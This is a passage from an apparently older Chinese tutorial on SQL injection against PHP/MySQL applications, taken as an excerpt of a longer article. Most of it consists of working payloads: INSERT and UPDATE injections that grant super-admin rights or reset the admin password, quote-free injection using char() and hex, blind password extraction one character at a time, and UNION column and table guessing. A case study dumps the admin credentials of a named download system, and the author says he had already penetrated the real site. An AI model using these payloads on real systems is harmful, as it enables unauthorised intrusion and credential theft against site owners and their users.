值得注意的是想要导出文件，必须magic_quotes_gpc没有打开，并且程序也没有用到addslashes()函数，还有不能对单引号做任何过滤，因为我们在提交导出路径的时候，一定要用引号包含起来，否则，系统不会认识那是一个路径，也不用尝试用char()或者什么函数，那是徒劳。</p><p><span style="font-weight:700;">INSERT</span></p><p>　　如果大家认为MYSQL中注入仅仅适用于SELECT就大错特错了，其实还有两个危害更大的操作，那就是INSERT和UPDATE语句，这类例子不多，先面先说说INSERT，这主要应用于改写插入的数据，我们来看个简单而又广泛存在的例子，看看下面的数据结构：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">CREATE TABLE `user` (<br>`userid` INT NOT NULL AUTO_INCREMENT ,<br>`username` VARCHAR( 20 ) NOT NULL ,<br>`password` VARCHAR( 50 ) NOT NULL ,<br>`homepage` VARCHAR( 255 ) NOT NULL ,<br>`userlevel` INT DEFAULT '1' NOT NULL ,<br>PRIMARY KEY ( `userid` )<br>);</span></p></td></tr></tbody></table></div><p>　　其中的userlevel代表用户的等级，1是普通用户，2是普通管理员，3是超级管理员，一个注册程序默认是注册成普通用户，如下：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">INSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES ('', '$username', '$password', '$homepage', '1');</span></p></td></tr></tbody></table></div><p>　　默认userlevel字段是插入1，其中的变量都是没有经过过滤就直接写入数据库的，不知道大家有什么想法？对，就是直接注入，使我们一注册就是超级管理员。我们注册的时候，构造$homepage变量，就可以达到改写的目的，指定$homepage变量为：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://4ngel.net', '3’)#</span></p></td></tr></tbody></table></div><p>　　插入数据库的时候就变成：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">INSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES ('', 'angel', 'mypass', 'http://4ngel.net', '3’)#', '1');</span></p></td></tr></tbody></table></div><p>　　这样就注册成为超级管理员了。但这种利用方法也有一定的局限性，比如，我没有需要改写的变量如userlevel字段是数据库的第一个字段，前面没有地方给我们注入，我们也没有办法了。<br>或许INSERT还有更广泛的应用，大家可以自行研究，但原理都是一样的。</p><p><span style="font-weight:700;">UPDATE</span></p><p>　　和INSERT相比，UPDATE的应用更加广泛，如果过滤不够，足以改写任何数据，还是拿刚才的注册程序来说，数据结构也不变，我们看一下用户自己修改自己的资料，SQL语句一般都是这样写的：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE user SET password='$password', homepage='$homepage' WHERE id='$id'</span></p></td></tr></tbody></table></div><p>　　用户可以修改自己的密码和主页，大家有什么想法？总不至于还是提升权限吧？程序中的SQL语句又没有更新userlevel字段，怎么提升啊？还是老办法，构造$homepage变量, 指定$homepage变量为：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://4ngel.net', userlevel='3</span></p></td></tr></tbody></table></div><p>　　整个SQL语句就变成这样：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE user SET password='mypass', homepage='http://4ngel.net', userlevel='3' WHERE id='$id'</span></p></td></tr></tbody></table></div><p>　　我们是不是又变成超级管理员了？程序不更新userlevel字段，我们自己来。<br>还有更加绝的，直接修改任意用户的资料，还是刚才的例句，但这次安全一点，使用MD5加密：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='$id'</span></p></td></tr></tbody></table></div><p>　　尽管密码被加密了，但我们还是可以构造我们需要的语句，我们指定$password为：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">mypass)' WHERE username='admin'#</span></p></td></tr></tbody></table></div><p>　　这时整个语句变为：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)', homepage='$homepage' WHERE id='$id'</span></p></td></tr></tbody></table></div><p>　　这样就更改了更新的条件，我管你后面的代码是不是在哭这说：我们还没有执行啊。当然，也可以从$id下手，指定$id为：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">' OR username='admin'</span></p></td></tr></tbody></table></div><p>　　这时整个语句变为：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='' OR username='admin'</span></p></td></tr></tbody></table></div><p>　　照样也可以达到修改的目的，所以说注入是非常灵活的技术。如果有些变量是从数据库读取的固定值，甚至用$_SESSION['username']来读取服务器上的SESSION信息时，我们就可以在原来的WHERE之前自己构造WHERE并注释掉后面的代码，由此可见，灵活运用注释也是注入的技巧之一。这些技巧把注入发挥得淋漓尽致。不得不说是一种艺术。<br>　　变量的提交方式可以是GET或POST，提交的位置可以是地址栏、表单、隐藏表单变量或修改本地COOKIE信息等，提交的方式可以是本地提交，服务器上提交或者是工具提交，多种多样就看你如何运用了。</p><p><span style="font-weight:700;">高级应用</span></p><p><span style="font-weight:700;">1、 使用MYSQL内置函数</span></p><p>　　我们在ACCESS、MSSQL中的注入，有很多比较高级的注入方法，比如深入到系统，猜中文等，这些东西，在MYSQL也能很好得到发挥，其实在MYSQL有很多内置函数都可以用在SQL语句里，这样就可以使我们能在注入时更灵活，得到更多关于系统的信息。有几个函数是比较常用的：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">DATABASE()<br>USER()<br>SYSTEM_USER()<br>SESSION_USER()<br>CURRENT_USER()<br>……</span></p></td></tr></tbody></table></div><p>　　各个函数的具体作用大家可以查阅MYSQL手册，比如下面这句UPDATE：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE article SET title=$title WHERE articleid=1</span></p></td></tr></tbody></table></div><p>　　我们可以指定$title为以上的各个函数，因为没有被引号包含，所以函数是能正确执行的：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE article SET title=DATABASE() WHERE id=1&nbsp;<br>#把当前数据库名更新到title字段<br>UPDATE article SET title=USER() WHERE id=1&nbsp;<br>#把当前 MySQL 用户名更新到title字段<br>UPDATE article SET title=SYSTEM_USER() WHERE id=1&nbsp;<br>#把当前 MySQL 用户名更新到title字段<br>UPDATE article SET title=SESSION_USER() WHERE id=1&nbsp;<br>#把当前 MySQL 用户名更新到title字段<br>UPDATE article SET title=CURRENT_USER() WHERE id=1&nbsp;<br>#把当前会话被验证匹配的用户名更新到title字段</span></p></td></tr></tbody></table></div><p>　　灵活运用MYSQL内置的函数，可以获得不少有用的信息，比如数据库版本、名字、用户、当前数据库等，比如前面跨表查询的例子，提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1</span></p></td></tr></tbody></table></div><p>　　可以看到一篇文章，我们怎么样才能知道MYSQL数据库的相关信息呢？同样也是用MYSQL内置函数配合UNION联合查询，不过相比之下就简单得多了，甚至还可以读取文件！既然要用到UNION，同样要满足UNION的条件——字段数、数据类型相同。如果我们知道了数据结构，直接构造：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=-1 union select 1,database(),version()</span></p></td></tr></tbody></table></div><p>　　就可以返回当前数据库名和数据库版本，构造是比较容易的。<br>　　下面附上一段由我好友Super·Hei写的代码，可以把字符串转换为ASCII代码。感谢提供。</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">#!/usr/bin/perl<br>#cody by Super·Hei&nbsp;<br>#to angel<br>#C:\&gt;test.pl c:\boot.ini<br>#99,58,92,98,111,111,116,46,105,110,105</span></p><p><span style="color:#0000ff;">$ARGC = @ARGV;<br>if ($ARGC != 1) {<br>　　print "Usage: $0 \n";<br>　　exit(1);<br>}</span></p><p><span style="color:#0000ff;">$path=shift;</span></p><p><span style="color:#0000ff;">@char = unpack('C*', $path);</span></p><p><span style="color:#0000ff;">$asc=join(",",@char);</span></p><p><span style="color:#0000ff;">print $asc;</span></p></td></tr></tbody></table></div><p><span style="font-weight:700;">2、不加单引号注入</span></p><p><em>注：现在我们假设magic_quotes_gpc为on了。</em></p><p>　　众所周知，整形的数据是不需要用引号引起来的，而字符串就要用引号，这样可以避免很多问题。但是如果仅仅用整形数据，我们是没有办法注入的，所以我需要把我们构造的语句转换成整形类型，这个就需要用到CHAR()，ASCII(),ORD(),CONV()这些函数了，举个简单的例子：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username='angel'</span></p></td></tr></tbody></table></div><p>　　如何使$username不带引号呢？很简单我们这样提交就可以了。</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username=char(97,110,103,101,108)<br># char(97,110,103,101,108) 相当于angel，十进制。<br>SELECT * FROM user WHERE username=0x616E67656C<br># 0x616E67656C 相当于angel，十六进制。</span></p></td></tr></tbody></table></div><p>　　其他函数大家自己去测试好了，但是前提就如上面所说的，我们可以构造的变量不被引号所包含才有意义，不然我们不管构造什么，只是字符串，发挥不了作用，比如前面猜密码的例子(user,php)，我们把查询条件改为userid：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE userid=userid</span></p></td></tr></tbody></table></div><p>　　按照正常的，提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1</span></p></td></tr></tbody></table></div><p>　　就可以查询userid为1的用户资料，因为1是数字，所以有没有引号都无所谓，但是如果我们构造：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and password=mypass</span></p></td></tr></tbody></table></div><p>　　绝对错误，因为mypass是字符串，除非提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and password='mypass'</span></p></td></tr></tbody></table></div><p>　　由于magic_quotes_gpc打开的关系，这个是绝对不可能的。引号会变成/'，我们有什么办法可以把这些字符串变成整形数据吗？就是用CHAR()函数，如果我们提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and password=char(109,121,112,97,115,115)</span></p></td></tr></tbody></table></div><p>　　正常返回，实践证明，我们用CHAR()是可行的，我们就把CHAR()用进LEFT函数里面逐位猜解！</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,1)=char(109)</span></p></td></tr></tbody></table></div><p>　　正常返回，说明userid为1的用户，password字段第一位是char(109)，我们继续猜：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,2)=char(109,121)</span></p></td></tr></tbody></table></div><p>　　又正常返回，说明正确，但这样影响到效率，既然是整形，我们完全可以用比较运算符来比较：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,1)&gt;char(100)</span></p></td></tr></tbody></table></div><p>　　然后适当调整char()里面的数字来确定一个范围，很快就可以猜出来，到了后面的时候，还是可以用比较运算符来比较：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,3)&gt;char(109,121,111)</span></p></td></tr></tbody></table></div><p>　　而原来已经猜好的不用改变了，很快就可以猜完：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,6)=char(109,121,112,97,115,115)</span></p></td></tr></tbody></table></div><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="453" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php7.gif" width="760" style="border:0px;"></p><p>　　然后在mysql&gt;命令提示符下或者在phpMyadmin里面执行：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">select char(109,121,112,97,115,115)</span></p></td></tr></tbody></table></div><p>　　就会返回：mypass</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="344" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php8.gif" width="322" style="border:0px;"></p><p>　　当然也可以使用SUBSTRING(str,pos,len)和MID(str,pos,len)函数，从字符串 str 的 pos 位置起返回 len 个字符的子串。这个和ACCESS是一样的。还是刚才的例子，我们猜password字段的第三位、第四位试试，第三位是p，第四位是a，我们这样构造：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and mid(password,3,1)=char(112)<br>http://127.0.0.1/injection/user.php?userid=1 and mid(password,4,1)=char(97)</span></p></td></tr></tbody></table></div><p>　　我们要的结果就迸出来了。当然，如果觉得麻烦，还可以用更简单的办法，就是利用ord()函数，具体作用可以去查看MYSQL参考手册，该函数返回的是整形类型的数据，可以用比较运算符进行比较、当然得出的结果也就快多了，也就是这样提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))&gt;111<br>http://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))&lt;113<br>http://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))=112</span></p></td></tr></tbody></table></div><p>　　这样我们就得出结果了，然后我们再用char()函数还原出来就好了。至于其他更多函数，大家可以自己去试验，限于篇幅也不多说了。</p><p><span style="font-weight:700;">3、快速确定未知数据结构的字段及类型</span></p><p>　　如果不清楚数据结构，很难用UNION联合查询，这里我告诉大家一个小技巧，也是非常有用非常必要的技巧，充分发挥UNION的特性。<br>　　还是拿前面的show.php文件做例子，当我们看到形如xxx.php?id=xxx的URL的时候，如果要UNION，就要知道这个xxx.php查询的数据表的结构，我们可以这样提交来快速确定有多少个字段：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=-1 union select 1,1,1</span></p></td></tr></tbody></table></div><p>　　有多少个“1”就表示有多少个字段，可以慢慢试，如果字段数不相同，就肯定会出错，如果字段数猜对了，就肯定会返回正确的页面，字段数出来了，就开始判断数据类型，其实也很容易，随便用几个字母代替上面的1，但是由于magic_quotes_gpc打开，我们不能用引号，老办法，还是用char()函数，char(97)表示字母“a”，如下：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=-1 union select char(97),char(97),char(97)</span></p></td></tr></tbody></table></div><p>　　如果是字符串，那就会正常显示“a”，如果不是字符串或文本，也就是说是整形或布尔形，就会返回“0”，如图：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="432" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php9.GIF" width="521" style="border:0px;"></p><p>　　判断最主要靠什么？经验，我以前一直都说，经验很重要，丰富经验能更好的作出正确的判断，因为程序的代码是千变万化的，我们这里是只是举个最简单的例子，这里由于局限性，程序都是我自己写、自己测试的。方法因程序而异。希望大家在实战中，注意区别，不要照搬，灵活运用才是根本。</p><p><span style="font-weight:700;">4、猜数据表名</span></p><p>　　在快速确定未知数据结构的字段及类型的基础上，我们又可以进一步的分析整个数据结构，那就是猜表名，其实使用UNION联合查询的时候，不管后面的查询怎么“畸形”，只要没有语句上的问题，都会正确返回，也就是说，我们可以在上面的基础上，进一步猜到表名了，比如刚才我们提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1 union select 1,1,1</span></p></td></tr></tbody></table></div><p>　　返回正常的内容，就说明这个文件查询的表内是存在3个字段的，然后我们在后面加入from table_name，也就是这样：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from members<br>http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from admin<br>http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from user</span></p></td></tr></tbody></table></div><p>　　如果这个表是存在的，那么同样会返回应该显示的内容，如果表不存在，当然就会出错了，所以我的思路是先获得有漏洞的文件所查询表的数据结构，确定结果后再进一步查询表，这个手工操作是没有效率的问题的，不到一分钟就可以查询到了，比如我们在测试www.***bai.net就是这样，后面的实例会涉及到。<br>　　但是有一个问题，由于很多情况下，很多程序的数据表都会有一个前缀，有这个前缀就可以让多个程序共用一个数据库。比如：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">site_article<br>site_user<br>site_download<br>forum_user<br>forum_post<br>……</span></p></td></tr></tbody></table></div><p>　　如果安全意识高的话，管理员会加个表名前缀，那猜解就很麻烦了，不过完全可以做一个表名列表来跑。这里就不多说了，后面会有一个具体的例子来解开一切迷茫^_^……</p><p><span style="font-weight:700;">实例</span></p><p>　　下面对一个国内非常出名的站点进行善意的攻击测试，来对上面的知识进行一次大概的验证，出于影响等诸多因素，我们称这个站点为HB(www.***bai.net)，HB使用的是夜猫的文章系统和下载系统，不过文章系统已经升级了，我们就不看了，下载系统是绝对有问题的，不过由于我现在写文章的电脑不上网，我用相同的下载系统在本地进行一次模拟的测试。实际上，我事前早用更狠毒的技术渗透过HB。<br>　　首先我们找到有问题的文件，show.php?id=1，我们马上看看数据结构和表名，看看HB有没有改字段和表名，我早知道夜猫下载系统1.0.1版的软件信息的表有19个字段，就提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</span></p></td></tr></tbody></table></div><p>　　注意，这里有19个“1”，返回正常的页面，我可以可以肯定字段没有变，我们也就别拖拉了，直接看看夜猫的默认用户数据表是否存在：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user</span></p></td></tr></tbody></table></div><p>　　正常返回，如图，如果URL不清楚可以看标题那里：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="653" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php10.GIF" width="715" style="border:0px;"></p><p>　　嗯，这个HB还真是够懒的，这么烂的程序也不知道先修改一下再用，不过也是，没有多少人和我一样有闲心先去加固程序才用的，再看默认的用户id还在不在？</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</span></p></td></tr></tbody></table></div><p>　　忘记了，就算不存在id为1的用户，前面的查询是真的，照样会正常返回数据库的软件信息，我们只能让前面的查询为假，才能使后面查询的结果显示出来，但我们要注意一点，show.php文件里面有这样一段代码：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">if ($id &gt; "0" &amp;&amp; $id &lt; "999999999" ):<br>//这里是正确执行的代码<br>else:<br>echo "&lt;p&gt;&lt;center&gt;&lt;a href=./list.php&gt;无记录&lt;/a&gt;&lt;/p&gt;\n";</span></p></td></tr></tbody></table></div><p>　　也就是说我们的ID的值再怎么离谱也不能在0和999999999之外，HB的软件肯定不会超过10000个的，我们就提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=10000 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</span></p></td></tr></tbody></table></div><p>　　正常返回了，表格里的数据全部是“1”，说明ID还在哦。如果不存在的话，页面只返回的数据全部是不详，因为程序的判断是如果数据为空就显示不详。现在确定了ID存在后，还要确定是不是管理员才行啊：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=10000 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and groupid=1</span></p></td></tr></tbody></table></div><p>　　程序规定groupid为1是超级管理员，既然都返回正确信息了，我们就直接构造畸形语句，暴出我们需要的用户名和密码，嘿嘿，首先看看ymdown表的数据结构，因为show.php是查询它的，所以我们应该看它的数据结构。</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">CREATE TABLE ymdown (<br>　id int(10) unsigned NOT NULL auto_increment,<br>　name varchar(100) NOT NULL,<br>　updatetime varchar(20) NOT NULL,<br>　size varchar(100) NOT NULL,<br>　empower varchar(100) NOT NULL,<br>　os varchar(100) NOT NULL,<br>　grade smallint(6) DEFAULT '0' NOT NULL,<br>　viewnum int(10) DEFAULT '0' NOT NULL,<br>　downnum int(10) DEFAULT '0' NOT NULL,<br>　homepage varchar(100), demo varchar(100),<br>　brief mediumtext, img varchar(100),<br>　sort2id smallint(6) DEFAULT '0' NOT NULL,<br>　down1 varchar(100) NOT NULL,<br>　down2 varchar(100),<br>　down3 varchar(100),<br>　down4 varchar(100),<br>　down5 varchar(100),<br>　PRIMARY KEY (id)<br>);</span></p></td></tr></tbody></table></div><p>　　用户名和密码的数据类型都是varchar，所以我们要选择ymdown表里数据类型是varchar来，如果把varchar的数据写到int的地方当然是不可能显示的了，由于updatetime（更新日期）的长度是20，可能会出现显示不完全的情况，我们就把用户名显示在name（软件标题）那里，密码显示在size（文件大小）那里好了，在19个“1”中，name和size分别是第二个和第四个，我们提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=10000 union select 1,username,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</span></p></td></tr></tbody></table></div><p>　　结果成功返回了我们所需要的用户名和密码，如图：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" 